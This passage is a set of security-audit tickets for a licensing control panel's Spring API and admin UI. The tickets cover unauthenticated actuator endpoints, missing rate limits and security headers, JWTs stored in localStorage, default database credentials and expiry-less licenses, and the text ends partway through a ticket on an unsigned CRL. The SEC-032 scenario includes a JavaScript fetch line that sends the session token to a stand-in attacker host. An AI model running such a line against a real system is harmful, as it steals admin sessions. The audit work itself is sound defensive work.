# Security Tickets — MEDIUM Severity

Extracted from the security audit (`AUDIT_findings.txt`). Each ticket corresponds to one confirmed/recorded MEDIUM-severity finding. Ticket number `SEC-NNN` uses the finding's ordinal (zero-padded). Technical detail is preserved from the audit; nothing is invented.

---

## [SEC-023] Actuator metrics/prometheus endpoints exposed without authentication

- **Severity:** MEDIUM
- **Dimension:** api-hardening
- **File(s)/location:** `control-panel-api/src/main/resources/application.yml` — `management.endpoints.web.exposure.include` (line 28); `control-panel-api/src/main/java/com/example/cp/auth/SecurityConfig.java` — `securityFilterChain` `authorizeHttpRequests` (lines 66-87)

**Description:**
`application.yml` exposes the actuator endpoints `health,info,metrics,prometheus` over HTTP. In `SecurityConfig` the authorization rules only `permitAll()` the specific paths `/actuator/health`, `/actuator/health/**`, and `/actuator/info`. The only `authenticated()` matcher is `/api/**`, and the final rule is `anyRequest().permitAll()`. Because `/actuator/metrics` and `/actuator/prometheus` do not match `/api/**`, they fall through to `anyRequest().permitAll()` and are reachable by any unauthenticated client. There is no separate actuator security chain, no `EndpointRequest.toAnyEndpoint()` rule, and no relocated base-path. `/actuator/metrics` and `/actuator/prometheus` leak operational internals (memory/heap, HTTP route names and per-URI request counts/latencies, datasource pool stats, JVM/build info). For a license control panel this reveals customer/endpoint topology and can be scraped continuously. (Note: the app is `SessionCreationPolicy.STATELESS`, so the claimed "active session counts" leak is not meaningful, but the per-URI HTTP route names, request counts/latencies via `http.server.requests`, JVM/heap/memory, HikariCP pool stats, and build/version info leaks are all real.)

**Attack scenario:**
An attacker who can reach the API host (the container publishes 8080 directly via docker-compose, `docker-compose.yml` lines 43-44) issues `GET /actuator/prometheus` and `GET /actuator/metrics` with no credentials. They enumerate every mapped URI (including internal/license/admin routes), observe request volumes and error rates to time attacks, and read JVM/build/version info to fingerprint exploitable dependency versions.

**Recommended fix:**
Add an explicit authorization rule that requires authentication (or an ops role) for all actuator endpoints, e.g. `.requestMatchers(EndpointRequest.toAnyEndpoint().excluding(HealthEndpoint.class, InfoEndpoint.class)).hasAuthority('ops.read')` placed before the catch-all, and/or change the catch-all from `anyRequest().permitAll()` to `anyRequest().authenticated()`. Restrict the exposure list to only what is needed and bind management to a separate internal port (`management.server.port`) not published externally.

- [ ] Status: open

---

## [SEC-024] Permissive `anyRequest().permitAll()` catch-all leaves non-/api paths open by default

- **Severity:** MEDIUM
- **Dimension:** api-hardening
- **File(s)/location:** `control-panel-api/src/main/java/com/example/cp/auth/SecurityConfig.java` — `securityFilterChain`, `authorizeHttpRequests` (line 87: `.anyRequest().permitAll()`)

**Description:**
The security chain only enforces `authenticated()` on `/api/**`. Every other path that is not in the explicit permitAll list (actuator metrics/prometheus, any future controller not mounted under `/api`, error dispatch paths, static/forward paths) defaults to `permitAll()`. This is a fail-open posture: any new endpoint or framework path that is not under `/api/**` is publicly accessible unless someone remembers to add it to the matcher list. The actuator exposure (SEC-023) is one concrete current consequence; the root cause is the open catch-all. There is exactly one `SecurityFilterChain` bean (no separate actuator chain mitigates this).

**Attack scenario:**
A developer later adds a controller under a different base path (or an actuator/management endpoint is enabled), assuming the global security config protects it. Because the catch-all is `permitAll`, the new endpoint ships publicly accessible without any code review flag.

**Recommended fix:**
Change the terminal rule to `.anyRequest().authenticated()` (or `denyAll()`) — fail closed — and explicitly enumerate the small set of truly public paths (health/info, jwks, CRL, swagger in non-prod, SSO callback URLs). This makes accidental exposure impossible by default.

- [ ] Status: open

---

## [SEC-025] Rate limiting dependency present but never configured — no throttling on any endpoint except login

- **Severity:** MEDIUM
- **Dimension:** api-hardening
- **File(s)/location:** `control-panel-api/pom.xml` — dependency `com.bucket4j:bucket4j-spring-boot-starter` (lines 74-76); no corresponding config in `application.yml`; no usage in source

**Description:**
`bucket4j-spring-boot-starter` is declared as a dependency (version 0.12.8), indicating rate limiting was intended, but there is zero bucket4j configuration in `application.yml` (no `bucket4j.filters`, `rate-limits`, `num-tokens`, etc.) and no programmatic usage anywhere in the source tree. The only Filter classes are `JwtAuthFilter` and `ApiKeyAuthFilter` (authentication, not throttling). The only throttle in the entire application is the in-memory per-email `LoginAttempt` lockout used by `AuthController.login`. All other endpoints — including unauthenticated `POST /api/v1/auth/password-reset/request`, `POST /api/v1/auth/password-reset/confirm`, the public `GET /api/v1/licenses/revoked` CRL, `/.well-known/jwks.json`, and the authenticated bulk `POST /api/v1/usage/ingest` (accepts an unbounded `@NotEmpty List<EventDto> events` with no `@Size` bound) — have no request throttling. The starter on the classpath without config provides no protection. (Note: reset tokens are 256-bit random, SHA-256 hashed, TTL 60 min, so brute-forcing `/confirm` is infeasible regardless of throttling; the residual risk is availability/abuse.)

**Attack scenario:**
An attacker floods `POST /api/v1/auth/password-reset/request` with a target's email to generate a flood of reset emails (email-bomb / account-harassment) and DB writes (a new `PasswordResetToken` row per call); or hammers the unauthenticated CRL/jwks endpoints to exhaust DB connections and CPU. None of these are slowed by anything.

**Recommended fix:**
Actually wire bucket4j: add `bucket4j.filters` config (or a programmatic filter) keyed by client IP / API key for the public and auth endpoints, with stricter buckets on `/api/v1/auth/**` and the unauthenticated CRL/jwks routes. Add per-IP throttling to password-reset request/confirm. Also cap the ingest `events` list size with a validation constraint (e.g. `@Size(max=...)`) to bound work per request.

- [ ] Status: open

---

## [SEC-026] No security/transport headers (HSTS, CSP, X-Content-Type-Options, X-Frame-Options) and SPA served over plain HTTP

- **Severity:** MEDIUM
- **Dimension:** api-hardening
- **File(s)/location:** `admin-ui/nginx.conf` — server block (entire file): `listen 80;`, only `Cache-Control` add_header present (line 13); no TLS, no security-header add_header; `control-panel-api/src/main/java/com/example/cp/auth/SecurityConfig.java` — no `HeadersConfigurer`

**Description:**
The nginx config that serves the admin SPA listens on plain HTTP port 80 with no TLS/HSTS and sets no security response headers. There is no `Strict-Transport-Security`, `Content-Security-Policy`, `X-Content-Type-Options: nosniff`, `X-Frame-Options`/frame-ancestors, or `Referrer-Policy`. The only add_header is a `Cache-Control` for `/assets/`. The Spring API side also adds no custom headers (no `HeadersConfigurer` in `SecurityConfig`; `.headers(...)` is never called); Spring Security's defaults apply only to responses passing through the chain and do not cover the statically-served SPA. There is no TLS-terminating proxy in front (docker-compose exposes the API directly on 8080 and runs the UI via vite dev on 5173; the production `admin-ui/Dockerfile` builds a static bundle into `nginx:alpine` with `EXPOSE 80` using this nginx.conf). For an admin panel that handles bearer tokens in the browser, the absence of CSP and clickjacking/MIME-sniffing protections is a real gap, and serving over HTTP means tokens and the login page transit in cleartext.

**Attack scenario:**
With no HSTS/TLS, a network attacker MITMs the plaintext HTTP admin UI and steals the bearer token / injects script. With no `X-Frame-Options`/CSP `frame-ancestors`, the admin panel can be framed for clickjacking; with no `X-Content-Type-Options: nosniff` and no CSP, an injected asset can be MIME-sniffed and executed as script.

**Recommended fix:**
Terminate TLS and redirect 80->443; add `Strict-Transport-Security`, a restrictive `Content-Security-Policy` (`default-src 'self'`, no inline script), `X-Content-Type-Options: nosniff`, `X-Frame-Options: DENY` (or CSP `frame-ancestors 'none'`), and `Referrer-Policy: no-referrer` in nginx (`add_header ... always`). On the API, add a `.headers(...)` configuration in `SecurityConfig` (HSTS, contentSecurityPolicy, frameOptions deny) for completeness.

- [ ] Status: open

---

## [SEC-027] No HTTP request body / form / header size limits configured

- **Severity:** MEDIUM
- **Dimension:** api-hardening
- **File(s)/location:** `control-panel-api/src/main/resources/application.yml` — whole file: no `server.tomcat.max-http-form-post-size`, `server.tomcat.max-swallow-size`, `spring.servlet.multipart.max-request-size`, or `server.max-http-request-header-size`; no `WebServerFactoryCustomizer` in source

**Description:**
There is no configuration anywhere bounding request size. JSON endpoints accept arbitrarily large bodies (Spring's JSON path is not covered by the multipart limit, and no Tomcat connector customization or `WebServerFactoryCustomizer` exists). The server is embedded Tomcat (spring-boot-starter-web, no servlet-container exclusion); Tomcat's default `max-http-form-post-size` (2MB) applies only to `application/x-www-form-urlencoded` parsing, NOT to a raw `application/json` `@RequestBody`, so it provides no protection. The bulk ingest endpoint `POST /api/v1/usage/ingest` deserializes an unbounded `@NotEmpty List<EventDto> events` (each with a free-form `Map<String,Object> metadata`) — `UsageIngestController.java` lines 36-37 / 67-77 — and there is no rate limiting to compound the exposure. `UsageIngestService.ingest` builds an `ArrayList` sized to `events.size()` and re-serializes each metadata map.

**Attack scenario:**
An authenticated low-privilege client (or compromised API key) POSTs a multi-hundred-MB JSON body (e.g. a huge events array or deeply nested metadata maps) to `/api/v1/usage/ingest`, forcing the server to buffer and deserialize it into memory, causing GC pressure / OOM and a denial of service. Repeated with no throttle, a few clients can exhaust the instance. (Endpoint sits behind `/api/**` `.authenticated()` and requires a valid active license jti, so it is not an unauthenticated DoS; impact is availability only.)

**Recommended fix:**
Set explicit limits in `application.yml`: `server.tomcat.max-http-form-post-size`, `server.tomcat.max-swallow-size`, `server.max-http-request-header-size`, and `spring.servlet.multipart.max-request-size/max-file-size`. Add a body-size guard for JSON (a servlet filter or gateway/nginx `client_max_body_size`), and add `@Size(max=...)` to the ingest events list and validate metadata size.

- [ ] Status: open

---

## [SEC-028] API keys never expire and have no rotation mechanism

- **Severity:** MEDIUM
- **Dimension:** apikey-security
- **File(s)/location:** `control-panel-api/src/main/java/com/example/cp/apikeys/ApiKey.java` — `ApiKey` entity (no `expires_at` field, lines 25-55); `10-apikeys.sql` (no `expires_at` column, lines 4-14); `ApiKeyService.verify()` lines 67-82; `ApiKeyController.java` lines 31-51

**Description:**
The `ApiKey` entity and the `api_keys` table have `created_at`, `last_used_at`, and `revoked_at` but NO expiry column, and `verify()` only checks `revokedAt != null` (plus a constant-time hash match) — there is no time-based validity/expiry check. There is no expiration, no max-age, and no rotation API (create + revoke exist, but no atomic rotate, and create never sets an expiry). The controller exposes only create (POST), list (GET), and revoke (DELETE). (The `key.rotate` permission / `/rotate` endpoint in the codebase is for SIGNING keys, not API keys.) The codebase implements expiry elsewhere (license tokens, session tokens, password-reset tokens) yet deliberately omits it for API keys. A leaked production key is valid indefinitely until a human notices and manually revokes it.

**Attack scenario:**
A long-lived `cp_...` key is embedded in a customer's Docker image, CI config, or laptop and later leaked (image push, git commit, laptop theft). Because keys are immortal, the leaked credential authenticates to the control panel forever; there is no automatic expiry to bound the exposure window, and no rotation flow to roll it without an outage.

**Recommended fix:**
Add an `expires_at` column and enforce it in `verify()` (treat expired keys like revoked). Provide a rotation endpoint that issues a new secret for the same logical key with an overlap window, and consider a configurable default max lifetime plus surfacing `last_used_at`-based staleness in the UI for cleanup.

- [ ] Status: open

---

## [SEC-029] Audit write failures are silently swallowed; no fail-closed option for security-critical events

- **Severity:** MEDIUM
- **Dimension:** audit-integrity
- **File(s)/location:** `control-panel-api/src/main/java/com/example/cp/audit/AuditWriter.java` — `record(...)` `catch (Exception e)` (lines 61-63); `AuditInterceptor` `afterMutating` `catch (Exception e)` (lines 74-75)

**Description:**
`AuditWriter.record` wraps the INSERT into `audit_log` in `try/catch(Exception)` and only logs an error, returning normally (it is `void` and never signals failure). Because `record` runs in `@Transactional(REQUIRES_NEW)` (line 30) invoked from `AuditInterceptor.afterMutating`, an `@AfterReturning` advice that runs only after the business transaction has already committed, a failure to persist the audit row (DB down, trigger/permission error, jsonb cast failure on payload, `::inet` cast on a spoofable X-Forwarded-For, oversized payload) is invisible to the caller: the privileged business action (key rotation, license revoke, role change) has already succeeded and returned 2xx with no corresponding audit record. The interceptor itself also catches all exceptions and only logs a warning (a second swallow layer). There is no mechanism to fail-closed. (Contrast: `OutboxRecorder.record` uses `Propagation.REQUIRED` so domain events are atomic — the system knows how to make a write atomic, but audit logging deliberately is not, and the outbox does not compensate as an alternate trail.)

**Attack scenario:**
An attacker induces audit-insert failures (e.g. submits an action whose payload triggers a jsonb error, sets a malformed X-Forwarded-For to fail the `::inet` cast, or times privileged calls during a brief audit-DB outage) and then performs license revocations or RBAC changes. The mutations commit and return 2xx, but no `audit_log` rows are produced (`key.rotated`, `license.revoked`, `rbac.role.assigned/removed`), giving the attacker an actions-without-trail primitive. The actor can partially influence inserted values (ip via X-Forwarded-For, payload via `AuditContext.putPayload`), making intentional induction plausible. (Requires already holding the privileged authority to perform the action.)

**Recommended fix:**
For high-value actions, either write the audit row in the same transaction as the business change (so both commit or both roll back) or provide a fail-closed mode where a `record()` failure on critical actions aborts the response / raises an alert. At minimum emit a metric and a high-severity alert (not just `log.warn`/`log.error`) when an audit insert fails, and add a reconciliation check.

- [ ] Status: open

---

## [SEC-030] Session JWT carries baked-in authorities for 12h with no revocation — role/permission removal and deactivation not enforced until expiry

- **Severity:** MEDIUM
- **Dimension:** authz-rbac
- **File(s)/location:** `control-panel-api/src/main/java/com/example/cp/auth/JwtAuthFilter.java` — `doFilterInternal()` lines 60-77; `SessionTokenService.issue()/parse()` embedding the `authorities` claim (lines 55-110); 12h TTL from `application.yml` `app.auth.session-ttl: PT12H`

**Description:**
On login, `AuthController.login` computes the user's authorities once (`AuthController.java:105`) and `SessionTokenService.issue` bakes them into the session JWT as a comma-joined `authorities` claim. `JwtAuthFilter` then, for any NON-super-admin user, trusts those embedded authority codes verbatim for the entire 12h token lifetime (lines 64-65: `else if (parsed.authorities() != null && !parsed.authorities().isEmpty()) authorityCodes = parsed.authorities();`). Only `super_admin` tokens re-resolve authorities from the database each request (lines 61-63). The session is STATELESS (`SecurityConfig.java:65`) with no allow/deny list and no per-request status/authority recheck. There is no session/JWT revocation: the session `jti` is generated (`SessionTokenService.java:68`) but never persisted or consulted. Consequently, when an admin removes a role (`RbacController.removeRole` only deletes `user_role` rows), strips a permission, or deactivates the account (`UserService.deactivate` only sets `Status.SUSPENDED`), the user's existing token continues to grant the old privileges until it expires. Account-status (ACTIVE) is checked only at login and password-reset, never in the filter for non-super-admins.

**Attack scenario:**
An employee holds `plan.write` and `license.issue`. After they are offboarded, an admin removes their roles and deactivates the account. The employee (or anyone who captured the bearer token) continues issuing licenses and editing plans for up to 12 hours because `JwtAuthFilter` honors the authorities baked into the still-unexpired JWT and never rechecks the database or account status for non-super-admin principals.

**Recommended fix:**
Do not trust an embedded authorities claim for authorization decisions; re-resolve authorities (and verify the user is still ACTIVE) from the database on each request as is already done for super admins, or maintain a server-side session/JWT revocation list (e.g. in the already-present Redis) keyed by `jti` or a per-user token-version checked on every request. At minimum shorten TTL and re-check `user.status == ACTIVE` in the filter so deactivated/role-stripped users lose access promptly.

- [ ] Status: open

---

## [SEC-031] Single static AES key-encryption-key with no envelope/KEK hierarchy, no versioning, and no key rotation for the at-rest master key

- **Severity:** MEDIUM
- **Dimension:** crypto-keys
- **File(s)/location:** `control-panel-api/src/main/java/com/example/cp/keys/KeyEncryptor.java` — `init()` lines 35-64; `encrypt()` 66-79; `decrypt()` 81-98

**Description:**
All Ed25519 signing private keys are encrypted at rest with one fixed AES-GCM key derived directly from the env var `APP_KEY_ENC_MASTER` (`app.signing.master-key`). There is no envelope/data-key hierarchy (no per-record data key wrapped by the master KEK), no key-version/key-id byte embedded in the stored blob, and no supported path to rotate the master key. The stored blob layout is just `[IV(12) || ciphertext || GCM tag]` with no associated data (AAD) binding the blob to its kid or DB row (`cipher.init()` at lines 71 and 91 never calls `updateAAD()`), and no version tag identifying which master key encrypted it. Consequences: (1) rotating/retiring a compromised master key requires bulk re-encrypting every `signing_keys` row by hand with no in-code support (`KeyService.rotate()` only mints a NEW Ed25519 keypair, it does not re-wrap existing blobs) and no way to tell which key version a blob used; (2) absence of AAD means nothing binds ciphertext to kid/status. The IV handling itself is correct (fresh 12-byte SecureRandom IV per encrypt, 128-bit tag) — this is a design/governance weakness, not an IV-reuse bug. (Audit note: the "swap a RETIRED ciphertext onto the ACTIVE row to forge licenses" exploit narrative does NOT hold — a swapped private key would produce signatures stamped with the ACTIVE kid that fail verification against the published public key; and a DB-write attacker could simply overwrite both key columns regardless of AAD, since `getActiveSigningKeyPair()` never checks the decrypted private key matches `public_key_pem`.)

**Attack scenario:**
If `APP_KEY_ENC_MASTER` ever leaks, there is no rotation mechanism: every signing private key, past and present, is permanently compromised with no clean recovery path. The absence of AAD and version tags also leaves the at-rest layout governance-fragile (no per-record binding, no migration path) for a license-signing root of trust.

**Recommended fix:**
Bind ciphertext to its row by passing the kid (and status/id) as AES-GCM AAD in both `encrypt()` and `decrypt()`. Prepend a 1-byte key-version/format identifier to the stored blob and support multiple master-key versions so the KEK can be rotated and old blobs re-wrapped. Prefer a real KMS/HSM (AWS KMS, GCP KMS, Vault transit) or at least an envelope scheme (random per-record data key wrapped by the master KEK) so signing private keys never sit decryptable under a single long-lived secret, and document/implement a master-key rotation runbook.

- [ ] Status: open

---

## [SEC-032] Session JWT stored in localStorage and sent as Bearer token — fully XSS-exfiltratable

- **Severity:** MEDIUM
- **Dimension:** frontend-secrets
- **File(s)/location:** `admin-ui/src/lib/api.ts` — `getStoredToken/setStoredToken` (lines 24-32), request interceptor (lines 39-46); consumed in `admin-ui/src/lib/auth.tsx` `login()` line 50; `control-panel-api/.../AuthController.java` line 115 (LoginResponse.accessToken)

**Description:**
The control-panel session credential is a JWT returned in the login JSON body (`AuthController.LoginResponse.accessToken`) and persisted by the SPA into `window.localStorage` under key `cp.accessToken` (`TOKEN_STORAGE_KEY`). It is read back on every request and attached as an `Authorization: Bearer` header. localStorage is readable by any JavaScript executing in the origin, so any XSS (or a compromised npm dependency / supply-chain script) can read the full admin session token and exfiltrate it. The backend is explicitly STATELESS with CSRF disabled (`SecurityConfig.java` lines 63-65), so this token IS the session — there is no httpOnly cookie fallback. Logout is a server-side no-op (`AuthController.logout` lines 118-126 only writes an audit entry and returns 204). There is no server-side revocation: `SessionTokenService.parse` verifies only signature and expiry; the `jwtID` is never checked against any blacklist. TTL defaults to 12h. (Calibration: this is a contingent, defense-in-depth weakness requiring a separate XSS/supply-chain primitive, hence medium not high. Minor: the session token is HS256/HMAC, not Ed25519 — Ed25519 applies to the offline license JWTs.)

**Attack scenario:**
An attacker who lands any script execution in the admin origin (a value rendered unsafely in a future page, a malicious transitive dependency, or a browser extension) runs `fetch('https://evil/c?t='+localStorage['cp.accessToken'])`. With the stolen Bearer token they call `/api/v1/admin/keys/rotate` and `/api/v1/subscriptions/{id}/licenses` to mint licenses, for up to 12 hours, with no server-side revocation possible.

**Recommended fix:**
Move the session credential to a `Set-Cookie` with `HttpOnly`, `Secure`, `SameSite=Strict` (or Lax) issued by the backend on `/auth/login`, and have the browser send it automatically (the axios client already uses `withCredentials:true`). Drop the Authorization-header/localStorage path for the first-party SPA. If a header-based scheme must remain, keep only a short-lived in-memory access token plus an HttpOnly refresh cookie, and add a server-side token revocation/denylist so logout actually invalidates the session. Re-enable CSRF protection once cookies are used.

- [ ] Status: open

---

## [SEC-033] control-panel-api container runs as root (no USER directive)

- **Severity:** MEDIUM
- **Dimension:** frontend-secrets
- **File(s)/location:** `control-panel-api/Dockerfile` — runtime stage, lines 13-17 (no USER before ENTRYPOINT)

**Description:**
The control-panel API runtime image (`eclipse-temurin:21-jre-alpine`) never creates or switches to a non-root user, so the JVM and any process spawned by a future RCE/deserialization bug runs as UID 0 inside the container. This is the most sensitive service in the system — it holds the AES master key (`app.signing.master-key` / `APP_KEY_ENC_MASTER`) used to encrypt signing private keys and can mint licenses. The project clearly knows better: `sample-docker-app/Dockerfile` (lines 24, 38) creates `addgroup -S app && adduser -S app -G app` and sets `USER app`, but the control-panel-api Dockerfile omits this. (Defense-in-depth / CIS-Docker-Benchmark hardening gap; requires a second code-execution flaw to be impactful, and the master key lives in the process environment regardless of UID.)

**Attack scenario:**
An attacker exploiting any code-execution flaw in the API (e.g. via a vulnerable dependency) gets root in the container, easing container-escape / privilege-escalation primitives and access to mounted secrets, versus a constrained non-root user.

**Recommended fix:**
Add a non-root user to the `control-panel-api/Dockerfile` runtime stage, e.g. `RUN addgroup -S app && adduser -S app -G app && chown -R app:app /app` then `USER app` before the ENTRYPOINT, mirroring `sample-docker-app/Dockerfile`. Consider a read-only root filesystem and dropping Linux capabilities in compose/k8s as well.

- [ ] Status: open

---

## [SEC-034] Hardcoded default DB/Redis credentials and exposed datastore ports in docker-compose.yml

- **Severity:** MEDIUM
- **Dimension:** frontend-secrets
- **File(s)/location:** `docker-compose.yml` — postgres service lines 4-9 (`POSTGRES_PASSWORD: cp`), redis service lines 18-21 (no auth), port mappings 5432/6379 to host; `application.yml` lines 6-7 (`DB_USER:cp` / `DB_PASS:cp` fallbacks)

**Description:**
Postgres is configured with trivial, identical username/password/db all equal to `cp` and the port is published to the host (`5432:5432`). Redis runs with no password (no `requirepass`) and is also published (`6379:6379`). These same defaults are baked as fallbacks in `application.yml` (`${DB_USER:cp}` / `${DB_PASS:cp}`). This file is the system's only shipped deployment descriptor and there is no separate hardened prod compose; the README documents it as the run/deploy descriptor and even advertises "Postgres: localhost:5432 (db cp, user cp, pass cp)". Copying it to a server (or running it on a host reachable from other networks) exposes the licensing database and Redis with guessable/no credentials. (Note: the Redis-impact claims are overstated for this codebase — the login-attempt lockout `LoginAttempt` and `LicenseEnvelopeCache` are in-memory ConcurrentHashMaps, and bucket4j/redis are declared deps with no actual wiring; the dominant valid risk is unauthenticated Postgres access. `APP_KEY_ENC_MASTER` is correctly NOT defaulted, so signing keys at rest remain encrypted even with DB access.)

**Attack scenario:**
On a host where 5432/6379 are reachable, an attacker connects directly to Postgres with `cp/cp` and reads/modifies organizations, subscriptions, signing-key metadata, password-reset token hashes, and audit rows — bypassing the API and its RBAC entirely (Liquibase changelogs include 05-signing-keys, 06-licenses, 08-audit, 10-apikeys, 99-auth-password-reset). Redis with no auth allows direct cache access.

**Recommended fix:**
Require strong, injected secrets (use the same `${VAR:?must be set}` pattern already applied to `APP_KEY_ENC_MASTER`) for `POSTGRES_PASSWORD` and a Redis `--requirepass`. Do not publish 5432/6379 to the host in production; keep them on the internal compose network only. Provide a dedicated production compose/profile that omits port publishing and dev fallbacks.

- [ ] Status: open

---

## [SEC-035] Outdated Spring Boot 3.3.4 with known framework/security CVEs

- **Severity:** MEDIUM
- **Dimension:** frontend-secrets (mislabel — this is a backend supply-chain/dependency-version issue)
- **File(s)/location:** `pom.xml` — parent version 3.3.4 (lines 8-12); `control-panel-api/pom.xml` lines 38-50 (spring-security-saml2-service-provider, oauth2-client)

**Description:**
The build pins `spring-boot-starter-parent` 3.3.4 (released Sept 2024) with no version overrides, so Spring Framework 6.1.13 and Spring Security 6.3.3 are inherited as-is. 3.3.4 is provably behind the 3.3.x train: 3.3.5 bumped Spring Framework to 6.1.14 (which fixes CVE-2024-38819), and numerous later 3.3.x patch releases addressed additional Spring/Tomcat/dependency CVEs. The application uses `spring-security-saml2-service-provider` and `oauth2-client` (areas with their own advisory history), with 7 SSO/SAML source files under `cp/sso/`, on an internet-facing admin API. Confidence is medium because exact exploitability depends on which endpoints/features map to each CVE, but the version is provably behind. (Note: CVE-2024-38819 specifically requires WebMvc.fn/RouterFunction handlers; this app uses only annotation-based `@RestControllers`, so that one CVE is not directly exploitable here — the finding does not overclaim it.)

**Attack scenario:**
An attacker probes the API for the specific Spring Framework path-traversal / Spring Security bypass patched after 3.3.4 and reaches resources or bypasses authorization that the application assumes are protected.

**Recommended fix:**
Bump `spring-boot-starter-parent` to the latest 3.3.x (or current 3.4.x) patch and re-test. Add the OWASP dependency-check or `mvn versions:display-dependency-updates` to CI, and run `npm audit` for admin-ui, so dependency CVEs are caught continuously rather than pinned indefinitely.

- [ ] Status: open

---

## [SEC-036] No Content-Security-Policy or security headers served for the admin SPA

- **Severity:** MEDIUM
- **Dimension:** frontend-secrets
- **File(s)/location:** `admin-ui/nginx.conf` — server block (only `Cache-Control` header set, on the `/assets/` location, line 13; no CSP/X-Frame-Options/X-Content-Type-Options/Referrer-Policy); `admin-ui/index.html` (no CSP meta tag)

**Description:**
The production nginx config that serves the built SPA sets no security response headers. There is no `Content-Security-Policy`, `X-Frame-Options`/frame-ancestors, `X-Content-Type-Options`, or `Referrer-Policy`, and `index.html` has no CSP meta tag. The production serving path is real: `admin-ui/Dockerfile` (lines 10-12) uses `nginx:alpine`, copies the built `/app/dist` to webroot, and copies `nginx.conf` to `/etc/nginx/conf.d/default.conf`. Because the session JWT lives in localStorage (`cp.accessToken`, see SEC-032), a CSP is the primary defense-in-depth that would block inline-script injection and constrain where a stolen token could be exfiltrated; its complete absence materially raises the impact of any XSS. The missing `frame-ancestors`/`X-Frame-Options` also leaves the admin UI clickjackable. No reverse-proxy tier in front injects these headers. (Defense-in-depth headers, conditional on a separate XSS/injection.)

**Attack scenario:**
Any injected script in the admin origin runs unrestricted (no script-src/connect-src limits) and can POST the localStorage token to an attacker host; or the admin UI is framed by a malicious site to trick an authenticated admin into clicking license-revoke / key-rotate controls.

**Recommended fix:**
Add restrictive security headers in `nginx.conf`: a CSP with `default-src 'self'`, an explicit `connect-src` limited to the API origin, `frame-ancestors 'none'`, plus `X-Content-Type-Options: nosniff`, `Referrer-Policy: no-referrer`, and `X-Frame-Options: DENY`. Pair this with moving the token to an HttpOnly cookie so a CSP bypass cannot directly read the credential.

- [ ] Status: open

---

## [SEC-037] Verifier accepts licenses with no 'exp' claim as never-expiring

- **Severity:** MEDIUM
- **Dimension:** license-integrity
- **File(s)/location:** `license-verifier/src/main/java/com/example/licenseverifier/LicenseVerifier.java` — `validateTemporalClaims()` lines 201-219; `License.isExpired()` lines 73-78; `License.status()` lines 80-89; `LicenseService.isExpired()` lines 127-133

**Description:**
`validateTemporalClaims()` guards every check behind a null test: `if (exp != null) { ... }` (line 204) and `if (nbf != null) { ... }` (line 212). A token that omits the `exp` claim entirely passes temporal validation unconditionally; there is no presence requirement for `exp`, `nbf`, or `iat`. Downstream, `License.isExpired()` returns false when `expiresAt == null`, `License.status()` returns ACTIVE, and the Spring starter's `LicenseService.isExpired()` returns false / `status()` returns ACTIVE, so the read-only-on-expiry safety net (`Status.READ_ONLY`) is never reached for an exp-less token. So a JWT with no `exp` is treated as a perpetual, never-expiring license. The issuer (`LicenseClaimsBuilder.build()`) always sets `exp` and rejects a past expiry, but the verifier does not enforce the issuer's contract — `docs/license-format.md` §4.1 marks `exp` as Required with "Verifier MUST reject if now > exp + clockSkew". The verifier is the offline security boundary, yet it accepts whatever it is given. (Verifier is similarly permissive for the `version` claim, corroborating a systemic "issuer sets, verifier doesn't enforce" pattern.)

**Attack scenario:**
Any party who can produce a validly-signed JWT without an `exp` claim (a future internal tool, a mis-built batch job, or an attacker who has compromised a signing key or an old retired key still published in JWKS) obtains a license that never expires and can never time-bound itself out. Expiry-based containment of a leaked or mis-issued license is lost. This also defeats the read-only-on-expiry safety net.

**Recommended fix:**
Treat `exp` as mandatory: in `validateTemporalClaims()`, if `claims.getExpirationTime() == null` throw `LicenseExpiredException`/`LicenseFileMalformedException`. Optionally also require `iat` and a sane maximum validity window (reject `exp - iat` greater than a configured ceiling) to bound damage from mis-issuance.

- [ ] Status: open

---

## [SEC-038] Download endpoint silently re-issues a brand-new license on cache miss, ignoring TTL override and bypassing issuance intent

- **Severity:** MEDIUM
- **Dimension:** license-integrity
- **File(s)/location:** `control-panel-api/src/main/java/com/example/cp/licenses/LicenseController.java` — `download()` lines 68-95 (`envelopeCache.get(jti).orElseGet(() -> issuer.issue(...))`, lines 81-85)

**Description:**
`GET /licenses/{jti}/download` is intended to return the exact previously-issued artifact. On an in-memory cache miss (process restart, eviction, or a different replica — `LicenseEnvelopeCache` is a plain in-memory ConcurrentHashMap), it calls `issuer.issue(token.getSubscriptionId(), computeRemainingDays(token.getExpiresAt()), null)` to mint a brand-new license bound to the same subscription, with a freshly computed TTL and the DEFAULT audience (override passed as `null`). The original audience/TTL override is NOT persisted (`LicenseToken` has only `expiresAt`, no audience column), so a license originally issued with a constrained audience is silently re-minted with the default audience. `LicenseIssuer.issue()` saves a brand-new `LicenseToken` row with a NEW `jti` and `Status.ACTIVE` and signs a fully valid JWT each miss; the new `jti` is distinct, so revoking the original `jti` does not cover the re-minted token (orphaned ACTIVE licenses). The endpoint is reachable by callers with only `subscription.read` or `@subAccess.canDownloadLicense`, i.e. lower-privileged than `license.issue` (per 02-rbac.sql, VIEWER and ORG_MEMBER get `subscription.read` but not `license.issue`). (Corrections: it does NOT bypass the audit — a new issuance event is still recorded but mis-attributed to the download-only caller; and `download()` does reject REVOKED tokens, so only non-revoked-but-cache-missed licenses are affected. TTL is approximately preserved; audience widening is the concrete relaxation.)

**Attack scenario:**
A caller who is allowed to download but NOT to issue (`subscription.read` / `canDownloadLicense`) repeatedly hits `/download` after a server restart and causes the system to mint new, valid, default-audience licenses on demand — effectively a license-issuance primitive granted to a download-only role. If the original license had a restricted audience, the re-issued copy silently widens it. Each call also creates new ACTIVE token rows that revocation of the original `jti` will not cover.

**Recommended fix:**
Do not re-issue inside a download path. Persist the signed JWT (or full envelope) durably at issuance time (DB/object store) keyed by `jti` and serve that exact artifact; on a true miss return 404/409 rather than minting. If re-issuance is genuinely required, gate it behind the `license.issue` authority and preserve the original ttl/audience recorded on the `LicenseToken` row.

- [ ] Status: open

---

## [SEC-039] CRL document is unsigned — a network attacker can serve a forged/empty revocation list

- **Severity:** MEDIUM
- **Dimension:** license-revocation
- **File(s)/location:** `control-panel-api/src/main/java/com/example/cp/licenses/CrlController.java` — `revoked()` lines 26-46 (returns a plain `Map<String,Object>` with no JWS/detached signature)

**Description:**
